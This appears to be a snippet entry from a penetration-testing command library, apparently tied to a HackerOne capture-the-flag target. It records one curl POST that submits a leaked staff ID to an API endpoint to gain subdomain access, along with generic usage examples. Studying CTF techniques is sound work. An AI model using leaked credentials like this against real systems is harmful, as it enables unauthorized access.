---
data: >-
  curl -X POST 'https://api.bountypay.h1ctf.com/api/staff' -d
  'staff_id=STAFF123'
tags:
  - api
  - access
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:58.058Z'
id: 74d9b24c-a999-49db-9ce2-ebb9bce21caa
verified: false
validated: true
submitted: true
---
# curl-staff-access

## Command

```bash
curl -X POST 'https://api.bountypay.h1ctf.com/api/staff' -d 'staff_id=STAFF123'
```

## Description

Posts leaked staff ID to gain subdomain access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d staff_id` | Leaked ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d 'id=123' endpoint
```

### Advanced Usage

```bash
curl -X POST -d 'id=123' -H 'Content-Type: application/x-www-form-urlencoded' endpoint
```

## Expected Output

Access token or redirect.

## Related

- [[Related Procedure]]
